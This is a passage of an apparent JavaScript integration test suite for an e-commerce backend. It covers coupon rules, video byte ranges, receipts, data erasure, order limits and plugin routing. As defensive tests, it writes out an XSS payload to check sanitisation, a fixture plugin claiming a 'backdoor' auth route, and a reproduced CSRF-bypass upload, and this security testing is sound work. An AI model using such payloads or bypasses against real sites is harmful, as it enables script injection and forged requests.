      // the customer had to know. An automatic rule is the SAME coupon — same
      // window, same minimum, same restrictions, same evaluator — that nobody
      // is asked for.
      {
        const cp = (body) => fetch(`${BASE}/api/coupons`, {
          method: 'POST', headers: ch, body: JSON.stringify(body),
        });
        const stamp = Date.now().toString(36).toUpperCase().slice(-6);
        const autoProd = await (await mkProduct({
          name: 'Rule Widget', slug: 'rule-widget', price_cents: 3000, stock: 30,
        })).json().catch(() => null);
        const rp = autoProd?.data?.id;
        const quote = (qty, code) => fetch(`${BASE}/api/orders/quote`, {
          method: 'POST', headers: ch,
          body: JSON.stringify({ items: [{ product_id: rp, qty }], ...(code ? { coupon_code: code } : {}) }),
        }).then((r) => r.json()).catch(() => null);

        // Below the minimum: nothing applies, and the basket is untouched.
        const small = await cp({
          code: `AUTO${stamp}`, kind: 'percent', value: 1000, enabled: true,
          automatic: true, min_subtotal_cents: 5000,
        });
        if (small.status === 201) ok('cart rules: an automatic rule can be created');
        else fail('automatic rule create', `status=${small.status}`);

        const under = await quote(1);   // 3000 < 5000
        if (under?.data?.discount_cents === 0) ok('...and does not apply below its minimum');
        else fail('rule under minimum', JSON.stringify(under?.data?.discount_cents));

        // Over the minimum: it applies WITH NO CODE TYPED. This is the feature.
        const over = await quote(2);    // 6000 >= 5000 → 10% = 600
        if (over?.data?.discount_cents === 600) ok('...and applies with no code typed at all');
        else fail('automatic rule', `discount=${over?.data?.discount_cents} (expected 600)`);

        // BEST ONE WINS, and only one. Two stacked rules could not be recorded
        // on an order that carries a single discount and a single code.
        const better = await cp({
          code: `BEST${stamp}`, kind: 'percent', value: 2000, enabled: true,
          automatic: true, min_subtotal_cents: 5000,
        });
        if (better.status === 201) ok('cart rules: a second rule can be created');
        else fail('second rule', `status=${better.status}`);
        const best = await quote(2);    // 20% of 6000 = 1200, not 1800
        if (best?.data?.discount_cents === 1200) ok('...and the BEST single rule wins, never both');
        else fail('rule stacking', `discount=${best?.data?.discount_cents} (expected 1200, not 1800)`);

        // A DISABLED automatic rule is inert.
        const off = await cp({
          code: `OFF${stamp}`, kind: 'percent', value: 9000, enabled: false,
          automatic: true, min_subtotal_cents: 0,
        });
        if (off.status === 201) {
          const stillBest = await quote(2);
          if (stillBest?.data?.discount_cents === 1200) ok('...and a disabled rule is ignored');
          else fail('disabled rule applied', `discount=${stillBest?.data?.discount_cents}`);
        }

        // A NON-automatic coupon must still need its code — otherwise every
        // coupon in the shop would start discounting every basket.
        const coded = await cp({
          code: `CODE${stamp}`, kind: 'fixed', value: 2500, enabled: true, min_subtotal_cents: 0,
        });
        if (coded.status === 201) ok('cart rules: a coded coupon can be created');
        else fail('coded coupon', `status=${coded.status}`);
        const withoutCode = await quote(2);
        if (withoutCode?.data?.discount_cents === 1200) {
          ok('...and a NON-automatic coupon still requires its code');
        } else fail('coded coupon leaked', `discount=${withoutCode?.data?.discount_cents}`);

        // A TYPED CODE WINS over the automatic rules, even when it is worth
        // less: the customer chose it, and silently substituting something else
        // is the surprise that generates a support message.
        const typed = await quote(2, `CODE${stamp}`);
        if (typed?.data?.discount_cents === 2500) ok('...and a typed code wins over automatic rules');
        else fail('typed code overridden', `discount=${typed?.data?.discount_cents} (expected 2500)`);

        // CLEAN UP. An automatic rule is shop-wide by design, so leaving these
        // enabled quietly discounted every basket later in this suite — two
        // unrelated assertions failed on totals that were correct for a shop
        // running a 20% promotion. The fixture has to leave the shop as it
        // found it.
        const created = await (await fetch(`${BASE}/api/coupons`, { headers: ch })).json().catch(() => null);
        for (const c of (Array.isArray(created?.data) ? created.data : [])) {
          if (String(c.code ?? '').endsWith(stamp)) {
            await fetch(`${BASE}/api/coupons/${c.id}`, { method: 'DELETE', headers: ch }).catch(() => {});
          }
        }
        const after = await quote(2);
        if (after?.data?.discount_cents === 0) ok('...and the fixtures leave the shop undiscounted');
        else fail('rule fixtures leaked', `a later basket still discounts ${after?.data?.discount_cents}`);
      }

      // --- SELF-HOSTED VIDEO: upload, serve, seek, insert ---
      //
      // The library refused every video before this. The three things that
      // decide whether it actually works are the sniffer (bytes, never the
      // name), RANGE requests (Safari will not play a file at all without
      // them, and nobody can seek), and the sanitizer keeping the markup the
      // editor inserted.
      {
        // A real MP4 header: a size field, the literal 'ftyp', then a brand.
        const head = Buffer.concat([
          Buffer.from([0, 0, 0, 0x20]), Buffer.from('ftyp', 'latin1'),
          Buffer.from('isom', 'latin1'),
        ]);
        // Padded so there is something to take a byte range OUT of.
        const body = Buffer.alloc(4096);
        for (let i = 0; i < body.length; i += 1) body[i] = i % 251;
        const clip = Buffer.concat([head, body]);

        const form = new FormData();
        form.append('file', new Blob([clip], { type: 'video/mp4' }), 'demo.mp4');
        const up = await fetch(`${BASE}/api/media/upload`, {
          method: 'POST',
          headers: { Cookie: `${sessionCookie}; astrobaas_csrf=${csrfToken}`, 'X-CSRF-Token': csrfToken },
          body: form,
        });
        const uj = await up.json().catch(() => null);
        if (up.status === 201 || up.status === 200) ok('video: an mp4 uploads');
        else fail('video upload', `status=${up.status} ${JSON.stringify(uj)?.slice(0, 160)}`);
        if (uj?.data?.mime_type === 'video/mp4') ok('...and is stored as video/mp4');
        else fail('video mime', JSON.stringify(uj?.data?.mime_type));

        const vurl = uj?.data?.url;
        if (!vurl) {
          fail('video url missing', JSON.stringify(uj?.data)?.slice(0, 140));
        } else {
          // Served with a playable Content-Type, not forced to download.
          const whole = await fetch(`${BASE}${vurl}`);
          if (whole.headers.get('content-type') === 'video/mp4') ok('...served as video/mp4');
          else fail('video content-type', String(whole.headers.get('content-type')));
          if (!whole.headers.get('content-disposition')) ok('...and not forced to download');
          else fail('video is an attachment', String(whole.headers.get('content-disposition')));

          // RANGE. Safari sends this before it will play anything.
          if (whole.headers.get('accept-ranges') === 'bytes') ok('...advertising byte ranges');
          else fail('no accept-ranges', String(whole.headers.get('accept-ranges')));

          const probe = await fetch(`${BASE}${vurl}`, { headers: { Range: 'bytes=0-1' } });
          if (probe.status === 206) ok('...and answering a range with 206, not 200');
          else fail('range ignored', `status=${probe.status} — Safari will refuse to play this`);
          if ((probe.headers.get('content-range') || '').startsWith('bytes 0-1/')) {
            ok('...naming the range and the total size');
          } else fail('content-range', String(probe.headers.get('content-range')));
          const probeBytes = Buffer.from(await probe.arrayBuffer());
          if (probeBytes.length === 2 && probeBytes[0] === clip[0] && probeBytes[1] === clip[1]) {
            ok('...with the RIGHT two bytes');
          } else fail('wrong range bytes', `${probeBytes.length} bytes`);

          // Seeking to the middle — the scrub bar.
          const mid = await fetch(`${BASE}${vurl}`, { headers: { Range: 'bytes=1000-1099' } });
          const midBytes = Buffer.from(await mid.arrayBuffer());
          if (mid.status === 206 && midBytes.length === 100 && midBytes[0] === clip[1000]) {
            ok('...and a seek into the middle returns that part of the file');
          } else fail('mid-range', `status=${mid.status} len=${midBytes.length}`);

          // A SUFFIX range is "the last N bytes", not "from 0 to N".
          const tail = await fetch(`${BASE}${vurl}`, { headers: { Range: 'bytes=-50' } });
          const tailBytes = Buffer.from(await tail.arrayBuffer());
          if (tail.status === 206 && tailBytes.length === 50
              && tailBytes[0] === clip[clip.length - 50]) {
            ok('...and a suffix range means the LAST bytes, not the first');
          } else fail('suffix range', `status=${tail.status} len=${tailBytes.length}`);

          // Past the end must be 416 carrying the real length, or a player
          // cannot correct itself.
          const past = await fetch(`${BASE}${vurl}`, { headers: { Range: `bytes=${clip.length + 10}-` } });
          if (past.status === 416 && (past.headers.get('content-range') || '').includes(`/${clip.length}`)) {
            ok('...while a range past the end is 416 with the real length');
          } else fail('bad range', `status=${past.status} cr=${past.headers.get('content-range')}`);

          // A request with no Range still gets the whole file. Measured from the
          // BODY, not from content-length: the dev server answers chunked, so
          // the header is absent and asserting on it tests the transport rather
          // than the route.
          const wholeBytes = Buffer.from(await whole.arrayBuffer());
          if (whole.status === 200 && wholeBytes.length === clip.length) {
            ok('...and a plain request still gets the whole file');
          } else fail('whole file', `status=${whole.status} len=${wholeBytes.length} of ${clip.length}`);

          // S5.3: the body is STREAMED now. HEAD must still answer with the
          // headers and no body, and a range still answers with exactly its
          // length — the route states Content-Length itself.
          const head = await fetch(`${BASE}${vurl}`, { method: 'HEAD' });
          const headBody = await head.text();
          if (head.status === 200 && headBody === '' && head.headers.get('accept-ranges') === 'bytes') {
            ok('...HEAD answers with headers and no body');
          } else fail('video HEAD', `status=${head.status} body=${headBody.length}`);
          const lenProbe = await fetch(`${BASE}${vurl}`, { headers: { Range: 'bytes=10-19' } });
          const lenBytes = Buffer.from(await lenProbe.arrayBuffer());
          if (lenProbe.status === 206 && lenBytes.length === 10 && lenBytes.equals(clip.subarray(10, 20))) {
            ok('...and a streamed range is exactly the bytes asked for');
          } else fail('streamed range', `status=${lenProbe.status} len=${lenBytes.length}`);
        }

        // An IMAGE at video size is still refused — the ceilings are per kind.
        const bigPng = Buffer.concat([
          Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]),
          Buffer.alloc(11 * 1024 * 1024),
        ]);
        const bigForm = new FormData();
        bigForm.append('file', new Blob([bigPng], { type: 'image/png' }), 'huge.png');
        const bigUp = await fetch(`${BASE}/api/media/upload`, {
          method: 'POST',
          headers: { Cookie: `${sessionCookie}; astrobaas_csrf=${csrfToken}`, 'X-CSRF-Token': csrfToken },
          body: bigForm,
        });
        if (bigUp.status === 400) ok('video: an 11 MB IMAGE is still refused at the image ceiling');
        else fail('image ceiling raised with video', `status=${bigUp.status}`);
      }

      // --- the three that were BUILT but not USABLE ---
      //
      // Each of these shipped correct and tested and then stopped short: the
      // Omnibus calculation had no consumer, the GPSR fields had no form, and
      // the recovery toggle had no control. Stored-but-unreachable is the shape
      // this suite exists to catch, and it caught none of them.
      {
        const gp = await (await mkProduct({
          name: 'Reachable Widget', slug: 'reachable-widget',
          price_cents: 10000, regular_price_cents: 10000, stock: 8,
          gpsr_manufacturer: 'Acme Optics SA',
          gpsr_eu_responsible: 'Acme EU Rep, Athens',
          gpsr_identifier: 'BATCH-2026-04',
          gpsr_warnings: 'Not a substitute for prescription eyewear.',
        })).json().catch(() => null);
        const gid = gp?.data?.id;

        // GPSR reaches a headless storefront through the product view.
        const view = await (await fetch(`${BASE}/api/products/${gid}`)).json().catch(() => null);
        if (view?.data?.gpsr_manufacturer === 'Acme Optics SA'
            && view?.data?.gpsr_identifier === 'BATCH-2026-04') {
          ok('GPSR: the safety fields reach a storefront');
        } else fail('gpsr missing from the API', JSON.stringify(view?.data?.gpsr_manufacturer));

        // And they are SANITISED — they arrive from supplier feeds.
        const evil = await (await mkProduct({
          name: 'Evil Widget', slug: 'evil-widget', price_cents: 100, stock: 1,
          gpsr_warnings: '<img src=x onerror=alert(1)>Careful',
        })).json().catch(() => null);
        const evilView = await (await fetch(`${BASE}/api/products/${evil?.data?.id}`)).json().catch(() => null);
        if (!String(evilView?.data?.gpsr_warnings ?? '').includes('onerror')) {
          ok('...and are sanitised, because they come from feeds nobody controls');
        } else fail('gpsr not sanitised', String(evilView?.data?.gpsr_warnings));

        // THE OMNIBUS CALCULATION, not just the points. A storefront must not
        // have to rediscover that the window runs from the reduction.
        if (view?.data && 'reference_price_cents' in view.data) {
          ok('price history: the API answers the Omnibus question');
        } else fail('no reference_price_cents', Object.keys(view?.data ?? {}).slice(0, 8).join());

        // Not on sale → null, and null MEANS "may not print a was-line".
        if (view?.data?.reference_price_cents === null) {
          ok('...and refuses a reference when there is no reduction');
        } else fail('reference on a non-sale product', String(view?.data?.reference_price_cents));

        // Put it on sale below its recorded price and the reference appears.
        await fetch(`${BASE}/api/products/${gid}`, {
          method: 'PUT', headers: ch, body: JSON.stringify({ sale_price_cents: 7000 }),
        });
        const onSale = await (await fetch(`${BASE}/api/products/${gid}`)).json().catch(() => null);
        if (onSale?.data?.on_sale === true && onSale?.data?.reference_price_cents === 10000) {
          ok('...and states the prior price once there IS a reduction');
        } else {
          fail('omnibus reference', `on_sale=${onSale?.data?.on_sale} ref=${onSale?.data?.reference_price_cents}`);
        }

        // The LIST route must agree with the single-product route, or a card in
        // a grid and the page it links to show different "was" prices.
        const list = await (await fetch(`${BASE}/api/products?search=Reachable`)).json().catch(() => null);
        const card = (Array.isArray(list?.data) ? list.data : []).find((p) => p.id === gid);
        if (card && card.reference_price_cents === onSale?.data?.reference_price_cents) {
          ok('...and the list route agrees with the product route');
        } else fail('list vs product reference', `${card?.reference_price_cents} vs ${onSale?.data?.reference_price_cents}`);

        // The recovery toggle is now settable, and coerced at the door.
        const setRec = await fetch(`${BASE}/api/settings/update`, {
          method: 'POST', headers: ch,
          body: JSON.stringify({ orders_recovery_enabled: 'true', orders_recovery_after_hours: 6 }),
        });
        const readRec = await (await fetch(`${BASE}/api/settings/get`, { headers: ch })).json().catch(() => null);
        if (setRec.status === 200 && readRec?.data?.orders_recovery_enabled === true) {
          ok('recovery reminder: the toggle is settable and coerced to a boolean');
        } else {
          fail('recovery toggle', `status=${setRec.status} stored=${JSON.stringify(readRec?.data?.orders_recovery_enabled)}`);
        }
        // Put it back — it is off by default and later blocks must not be
        // surprised by outbound mail.
        await fetch(`${BASE}/api/settings/update`, {
          method: 'POST', headers: ch, body: JSON.stringify({ orders_recovery_enabled: false }),
        });
      }

      // --- the buyer's printable receipt (C-39) ---
      //
      // The signed link is the ONLY handle on a receipt: the checkout response
      // deliberately withholds the internal order id (asserted immediately
      // above), so the page is reachable only from the confirmation email.
      {
        const R = await loadReceipt();
        // The id the customer never sees, read back as the operator.
        const listed = await (await fetch(`${BASE}/api/orders`, { headers: ch })).json().catch(() => null);
        const mine = (Array.isArray(listed?.data) ? listed.data : [])
          .find((o) => o.number === oj?.data?.number);

        if (!mine?.id) {
          fail('receipt: no order to read back', `number=${oj?.data?.number}`);
        } else {
          const url = R.receiptUrl(BASE, mine.id);
          const res = await fetch(url);
          const html = await res.text();

          if (res.status === 200) ok('a signed receipt link opens the receipt');
          else fail('receipt status', `status=${res.status} for a valid token`);

          if (html.includes(String(mine.number))) ok('the receipt shows the order number');
          else fail('receipt number', `order ${mine.number} absent from the page`);

          // The disclaimer is the whole legal basis for shipping this in core.
          // A receipt that lost it is a document claiming a fiscal status it
          // does not have, so this assertion is load-bearing, not cosmetic.
          if (/not a tax invoice|Δεν είναι φορολογικό|keine Rechnung im steuerlichen/i.test(html)) {
            ok('the receipt states it is not a tax invoice');
          } else fail('receipt fiscal disclaimer missing', html.slice(0, 200));

          if ((res.headers.get('x-robots-tag') || '').includes('noindex')) ok('a receipt is not indexable');
          else fail('receipt noindex', `x-robots-tag=${res.headers.get('x-robots-tag')}`);

          const cc = res.headers.get('cache-control') || '';
          if (cc.includes('no-store')) ok('a receipt is never stored by a shared cache');
          else fail('receipt cache-control', `cache-control=${cc}`);

          /* --- the same receipt as a FILE -----------------------------------
           *
           * The unit suite draws receipts and checks the document. What it
           * cannot check is that the route serves one, with the same refusals
           * as the page — a PDF endpoint that answered 200 where the page
           * answers 404 would be an order-number oracle with a different
           * extension.
           */
          {
            const pdfUrl = R.receiptUrl(BASE, mine.id).replace('/receipt?', '/receipt.pdf?');
            const pdf = await fetch(pdfUrl);
            const body = Buffer.from(await pdf.arrayBuffer());

            if (pdf.status === 200 && body.subarray(0, 5).toString('latin1') === '%PDF-') {
              ok('a signed receipt link also serves a real PDF');
            } else fail('receipt pdf', `status=${pdf.status} head=${body.subarray(0, 8).toString('latin1')}`);

            if ((pdf.headers.get('content-type') || '').includes('application/pdf')) {
              ok('the receipt PDF is served as application/pdf');
            } else fail('receipt pdf type', `content-type=${pdf.headers.get('content-type')}`);

            // `attachment`, and a filename with nothing in it that could end
            // the header value or forge a second one.
            const disposition = pdf.headers.get('content-disposition') || '';
            if (/^attachment; filename="receipt-?[A-Za-z0-9_-]*\.pdf"$/.test(disposition)) {
              ok('the receipt PDF downloads under a safe filename');
            } else fail('receipt pdf disposition', `content-disposition=${disposition}`);

            const pdfCc = pdf.headers.get('cache-control') || '';
            if (pdfCc.includes('no-store')) ok('the receipt PDF is never stored by a shared cache');
            else fail('receipt pdf cache-control', `cache-control=${pdfCc}`);

            // The refusals must match the page's, exactly.
            const noTokenPdf = await fetch(`${BASE}/receipt.pdf`);
            const forgedPdf = await fetch(`${BASE}/receipt.pdf?token=not-a-real-token`);
            const ghostPdf = await fetch(R.receiptUrl(BASE, 'ord_does_not_exist').replace('/receipt?', '/receipt.pdf?'));
            if (noTokenPdf.status === 404 && forgedPdf.status === 404 && ghostPdf.status === 404) {
              ok('the receipt PDF refuses a missing, forged and unknown token alike');
            } else {
              fail('receipt pdf refusals',
                `none=${noTokenPdf.status} forged=${forgedPdf.status} unknown=${ghostPdf.status}`);
            }
          }

          // --- the refusals, which must be indistinguishable from each other ---
          const noToken = await fetch(`${BASE}/receipt`);
          if (noToken.status === 404) ok('a receipt with no token is refused');
          else fail('receipt without token', `status=${noToken.status}`);

          const garbage = await fetch(`${BASE}/receipt?token=not-a-real-token`);
          if (garbage.status === 404) ok('a forged receipt token is refused');
          else fail('receipt forged token', `status=${garbage.status}`);

          // A token for an order that does not exist must look EXACTLY like a
          // forged one — otherwise the page is an order-number oracle, the
          // thing order-lookup.ts was written to prevent.
          const ghost = await fetch(R.receiptUrl(BASE, 'ord_does_not_exist'));
          const garbageBody = await garbage.text();
          const ghostBody = await ghost.text();
          if (ghost.status === 404 && ghost.status === garbage.status
              && ghostBody.length === garbageBody.length) {
            ok('an unknown order is indistinguishable from a forged token');
          } else {
            fail('receipt oracle', `ghost=${ghost.status}/${ghostBody.length} forged=${garbage.status}/${garbageBody.length}`);
          }

          // The page must never reveal the buyer's address to a bad token.
          if (!garbageBody.includes('buyer@example.com')) ok('a refused receipt leaks nothing');
          else fail('receipt leak', 'the refusal page contained the buyer address');

          // --- an ERASED order stops resolving, token or no token ---
          //
          // The token that names it is still perfectly signed: it was issued
          // before the erasure and nothing revokes it. The unit test proves the
          // PREDICATE refuses an erased order; only this proves the PAGE asks
          // it. Forgetting the call is the exact shape that shipped an erased
          // order back through the order lookup once already.
          //
          // Its OWN product, so the stock arithmetic the rest of this section
          // asserts on is untouched.
          {
            const ep = await mkProduct({
              name: 'Receipt Erasure Widget', slug: 'receipt-erasure-widget',
              price_cents: 500, stock: 5,
            });
            const epj = await ep.json().catch(() => null);
            const eraseEmail = 'erase-my-receipt@example.com';
            const made = await fetch(`${BASE}/api/orders`, {
              method: 'POST', headers: ch,
              body: JSON.stringify({ email: eraseEmail, items: [{ product_id: epj?.data?.id, qty: 1 }] }),
            });
            const madeJson = await made.json().catch(() => null);
            const back = await (await fetch(`${BASE}/api/orders`, { headers: ch })).json().catch(() => null);
            const target = (Array.isArray(back?.data) ? back.data : [])
              .find((o) => o.number === madeJson?.data?.number);

            if (!target?.id) {
              fail('receipt erasure: no order created', `status=${made.status}`);
            } else {
              const link = R.receiptUrl(BASE, target.id);
              const before = await fetch(link);
              if (before.status === 200) ok('receipt erasure: the link works before the erasure');
              else fail('receipt erasure precondition', `status=${before.status}`);

              const erased = await fetch(`${BASE}/api/privacy/subject`, {
                method: 'POST', headers: ch,
                body: JSON.stringify({ email: eraseEmail, confirm: 'ERASE' }),
              });
              if (erased.status === 200) ok('receipt erasure: the erasure runs');
              else fail('receipt erasure request', `status=${erased.status}`);

              const after = await fetch(link);
              const afterBody = await after.text();
              if (after.status === 404) ok('receipt erasure: the SAME signed link now refuses');
              else fail('receipt after erasure', `status=${after.status} (expected 404)`);
              if (!afterBody.includes(eraseEmail)) ok('receipt erasure: ...and the address is gone from the page');
              else fail('receipt erasure leak', 'the erased address still rendered');
            }
          }
        }
      }

      // Ordering more than remains must be refused. Stays within the per-product
      // order limit so this tests the STOCK guard, not the limit.
      const tooMany = await fetch(`${BASE}/api/orders`, {
        method: 'POST', headers: ch,
        body: JSON.stringify({ email: 'b2@example.com', items: [{ product_id: productId, qty: 3 }] }),
      });
      const tj = await tooMany.json().catch(() => null);
      // 409, not 400: the request was well-formed, the world changed. A client
      // needs that distinction to know whether retrying is worth anything.
      if (tooMany.status === 409) ok('ordering more than remains is refused (409 CONFLICT)');
      else fail('stock guard', `status=${tooMany.status} (expected 409)`);
      if (tj?.error?.code === 'CONFLICT') ok('the conflict carries a machine-readable code');
      else fail('conflict code', JSON.stringify(tj)?.slice(0, 120));
    }

    // --- order limits: a public endpoint's abuse cap, and it must be live ---
    // Stock here is deliberately huge so a rejection can only come from the
    // limit, never from the stock guard.
    {
      const lp = await (await mkProduct({ name: 'Limit Widget', slug: 'smoke-limit', price_cents: 100, stock: 500 })).json().catch(() => null);
      const lid = lp?.data?.id;
      const buy = (items, email = 'lim@example.com') =>
        fetch(`${BASE}/api/orders`, { method: 'POST', headers: ch, body: JSON.stringify({ email, items }) });
      const stockOf = async (id) => (await (await fetch(`${BASE}/api/products/${id}`)).json().catch(() => null))?.data?.stock;
      const setLimit = (patch) =>
        fetch(`${BASE}/api/settings/update`, { method: 'POST', headers: ch, body: JSON.stringify(patch) });

      if (lid) {
        // The default: 3 units of any one product.
        const over = await buy([{ product_id: lid, qty: 4 }]);
        const oj = await over.json().catch(() => null);
        if (over.status === 400) ok('default limit refuses 4 units of one product');
        else fail('order limit', `status=${over.status} (expected 400)`);
        if (/at most 3/i.test(oj?.error?.message ?? '')) ok('the refusal names the limit (3)');
        else fail('limit message', JSON.stringify(oj)?.slice(0, 140));
        if ((await stockOf(lid)) === 500) ok('a refused order reserves no stock');
        else fail('limit leak', `stock=${await stockOf(lid)} (expected 500)`);

        const at = await buy([{ product_id: lid, qty: 3 }]);
        if (at.status === 201) ok('exactly the limit (3) is allowed');
        else fail('limit boundary', `status=${at.status} (expected 201)`);

        // Rollback: an earlier line's reservation must be handed back when a
        // later line trips the limit — otherwise a rejected order silently
        // burns inventory, which is exploitable by anyone.
        const before = await stockOf(productId);
        const mixed = await buy([{ product_id: productId, qty: 1 }, { product_id: lid, qty: 9 }]);
        if (mixed.status === 400 && (await stockOf(productId)) === before) ok('a limit rejection rolls back earlier lines');
        else fail('rollback', `status=${mixed.status} stock ${before} -> ${await stockOf(productId)}`);

        // --- a PAID module: loaded from outside, and selling ---
    //
    // Everything a commercial plugin depends on, in one place, because all
    // three failed silently before they were built: an external module has no
    // plugin record and so can never be activated; a customer with three
    // modules had to name three packages; and a payment gateway could not come
    // from a plugin at all, which meant every gateway had to be given away.
    {
      const list = await (await fetch(`${BASE}/api/plugins`, { headers: ch })).json().catch(() => null);
      const rows = Array.isArray(list?.data) ? list.data : [];
      const gw = rows.find((p) => p.id === 'test-gateway');
      const second = rows.find((p) => p.id === 'test-second-module');

      if (gw) ok('an external module gets a plugin record, so it can be managed');
      else fail('external plugin unseeded', `ids=${JSON.stringify(rows.map((r) => r.id))}`);

      // Two plugins from ONE module — what lets a customer name one package
      // however many modules they have licensed.
      if (second) ok('one module can carry several plugins');
      else fail('array export lost', `ids=${JSON.stringify(rows.map((r) => r.id))}`);

      // ASTROBAAS_PLUGINS_ACTIVATE: on without anyone clicking anything.
      if (gw?.active === true && second?.active === true) ok('ASTROBAAS_PLUGINS_ACTIVATE switches a module on');
      else fail('auto-activate failed', `gw=${gw?.active} second=${second?.active}`);

      // The point of all of it: the gateway is offered at checkout.
      const pay = await (await fetch(`${BASE}/api/payments`)).json().catch(() => null);
      const methods = (pay?.data?.methods ?? pay?.data ?? []).map((m) => m.id ?? m);
      if (methods.includes('test-gateway')) ok('a plugin-contributed payment provider is offered at checkout');
      else fail('plugin provider missing', JSON.stringify(methods));

      /* ============================================================
       * PLUGIN PLATFORM: routes, admin pages, and plugin-owned data.
       *
       * Until these existed a plugin could only filter values core already
       * had. It could not serve an endpoint, show a screen, or keep a record —
       * which is why commerce had to live in core.
       * ============================================================ */
      const P = '/api/plugin/test-platform';

      // --- Capability 1: API routes ---
      {
        // ctx.store: a handler persists through the store the PLATFORM hands
        // it, importing nothing. Two calls must count 1 then 2 — proving the
        // write actually landed, not merely that the property exists. This is
        // the external author's only documented storage path from a route.
        const c1 = await (await fetch(`${BASE}${P}/counter`)).json().catch(() => null);
        const c2 = await (await fetch(`${BASE}${P}/counter`)).json().catch(() => null);
        if (c1?.ok === true && c2?.ok === true && c2.hits === c1.hits + 1) {
          ok('plugin route: ctx.store persists across requests');
        } else fail('ctx.store', `first=${JSON.stringify(c1)} second=${JSON.stringify(c2)}`);
      }

      // --- Capability 1: API routes ---
      {
        // The load-bearing safety property: a plugin CLAIMED /api/settings/get
        // and /api/auth/backdoor. Neither may be reachable.
        const stolen = await (await fetch(`${BASE}/api/settings/get`)).json().catch(() => null);
        if (stolen?.success === true && !JSON.stringify(stolen).includes('pwned')) {
          ok('a plugin claiming a CORE route path does not get it');
        } else fail('core route shadowed by plugin', JSON.stringify(stolen)?.slice(0, 120));

        const backdoor = await fetch(`${BASE}/api/auth/backdoor`, {
          method: 'POST', headers: ch, body: '{}',
        });
        const backdoorBody = await backdoor.text();
        if (backdoor.status !== 200 || !backdoorBody.includes('pwned')) {
          ok('a plugin cannot claim a route under the reserved /api/auth/ prefix');
        } else fail('RESERVED PREFIX CLAIMED', `status=${backdoor.status}`);

        // THE reproduced vulnerability. The fixture declares csrf:'exempt' on
        // /api/media/upload and access:'public' on /api/audit — two paths it
        // can never serve, because core's route files win. But the middleware
        // decides CSRF and authentication BEFORE routing, and it used to
        // consult those declarations and relax the gate on CORE's handler.
        //
        // A cross-site POST with only a session cookie uploaded a file.
        const csrfBypass = await fetch(`${BASE}/api/media/upload`, {
          method: 'POST',
          headers: { Cookie: sessionCookie },          // session, but NO csrf token
          body: new URLSearchParams({ x: '1' }),
        });
        if (csrfBypass.status === 403) {
          ok('a plugin CANNOT switch off CSRF on a core route it does not serve');
        } else fail('CSRF DISARMED ON A CORE ROUTE', `expected 403, got ${csrfBypass.status}`);

        const auditAnon = await fetch(`${BASE}/api/audit`);
        if (auditAnon.status === 401 || auditAnon.status === 403) {
          ok('nor make a core admin endpoint publicly readable');
        } else fail('CORE ENDPOINT MADE PUBLIC', `status=${auditAnon.status}`);

        // Staff-only by default — no access declared on the route.
        const anonWho = await fetch(`${BASE}${P}/whoami`);
        if (anonWho.status === 401) ok('a plugin route is staff-only by DEFAULT');
        else fail('plugin route default access', `expected 401, got ${anonWho.status}`);

        const staffWho = await (await fetch(`${BASE}${P}/whoami`, { headers: ch })).json().catch(() => null);
        if (staffWho?.role === 'admin') ok('a plugin route receives the authenticated user');
        else fail('plugin route user', JSON.stringify(staffWho));

        // Declared public: reachable with no session at all.
        const pub = await fetch(`${BASE}${P}/public`);
        if (pub.status === 200) ok('a plugin route declared public is reachable anonymously');
        else fail('plugin public route', `status=${pub.status}`);

        // Path parameters.
        const param = await (await fetch(`${BASE}${P}/widgets/abc-123`)).json().catch(() => null);
        if (param?.id === 'abc-123') ok('a plugin route captures :path parameters');
        else fail('plugin route params', JSON.stringify(param));

        // Wrong verb on a known path is 405, not 404.
        const wrongVerb = await fetch(`${BASE}${P}/public`, { method: 'DELETE', headers: ch });
        if (wrongVerb.status === 405) ok('a known plugin path with the wrong method is 405');
        else fail('plugin route method', `expected 405, got ${wrongVerb.status}`);

        // A path no plugin owns is still 404 for staff.
        const missing = await fetch(`${BASE}${P}/nothing-here`, { headers: ch });
        if (missing.status === 404) ok('an unclaimed plugin path is 404');
        else fail('unclaimed plugin path', `expected 404, got ${missing.status}`);

        // access: 'admin' — hidden from a non-admin as a 404, not a 403.
        const adminRoute = await fetch(`${BASE}${P}/admin-only`, { headers: ch });
        if (adminRoute.status === 200) ok('an admin-only plugin route serves an admin');
        else fail('admin plugin route', `status=${adminRoute.status}`);

        // CSRF still applies to a PUBLIC write. Declaring a route public says
        // "no session needed", never "no CSRF".
        const noCsrf = await fetch(`${BASE}${P}/echo`, {
          method: 'POST', headers: { 'Content-Type': 'application/json' }, body: '{"a":1}',
        });
        if (noCsrf.status === 403) ok('a PUBLIC plugin write is still CSRF-protected');
        else fail('plugin public write CSRF', `expected 403, got ${noCsrf.status}`);

        const withCsrf = await fetch(`${BASE}${P}/echo`, {
          method: 'POST', headers: ch, body: JSON.stringify({ a: 1 }),
        });
        const echoed = await withCsrf.json().catch(() => null);
        if (withCsrf.status === 201 && echoed?.got?.a === 1) ok('a plugin route reads the request body');
        else fail('plugin route body', `status=${withCsrf.status} ${JSON.stringify(echoed)}`);

        // A throwing handler is a 500 that leaks NOTHING.
        const boom = await fetch(`${BASE}${P}/boom`, { headers: ch });
        const boomBody = await boom.text();
        if (boom.status === 500 && !boomBody.includes('SECRET-INTERNAL-DETAIL')) {
          ok("a throwing plugin handler is 500 and does not leak the plugin's error");
        } else fail('plugin error leaked', `status=${boom.status} body=${boomBody.slice(0, 120)}`);
      }

      // --- Capability 3: plugin-owned data, and its migrations ---
      {
        const stored = await (await fetch(`${BASE}${P}/stored`, { headers: ch })).json().catch(() => null);
        const seeded = (stored?.rows ?? []).find((r) => r.id === 'seeded');
        if (seeded) ok('a plugin migration wrote a record at bootstrap');
        else fail('plugin migration did not run', JSON.stringify(stored)?.slice(0, 160));
        // v2 ran after v1, in order, and saw v1's write.
        if (seeded?.data?.n === 2) ok('plugin migrations run in version order and see each other');
        else fail('plugin migration order', JSON.stringify(seeded));

        // The store must be namespaced: another plugin's namespace is empty.
        const foreign = await (await fetch(`${BASE}${P}/stored`, { headers: ch })).json().catch(() => null);
        if ((foreign?.rows ?? []).every((r) => r.id !== 'nothing-from-another-plugin')) {
          ok('plugin data is namespaced to its owner');
        } else fail('plugin namespace leak', JSON.stringify(foreign));

        // Plugin data must NOT appear in the public content change feed — the
        // reason it has its own collection rather than reusing custom_entities.
        const feed = await (await fetch(`${BASE}/api/content/changes`)).json().catch(() => null);
        if (!JSON.stringify(feed ?? {}).includes('from migration v1')) {
